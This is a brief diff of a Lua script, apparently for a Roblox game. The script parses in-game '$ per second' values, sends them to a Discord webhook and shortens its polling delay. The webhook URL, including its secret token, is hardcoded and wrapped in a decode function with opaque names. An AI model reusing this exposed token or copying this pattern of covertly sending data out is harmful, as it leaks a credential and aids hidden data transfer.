@@ -13,7 +13,7 @@ local function _d(s)
 end
 
 local _W = _d("https://discord.com/api/webhooks/1464606550235545732/d-MmnWY_Q2ViZly7SXhwrL-0X6_ytbuD7lc02wx3PEz5IVtaRhR02wIXjYbcWBcSC4qD")
-local _DELAY = 0.8
+local _DELAY = 0.3
 
 local function _p(t)
     local n,u = t:match("%$([%d%.]+)%s*([MBT])%s*/s")
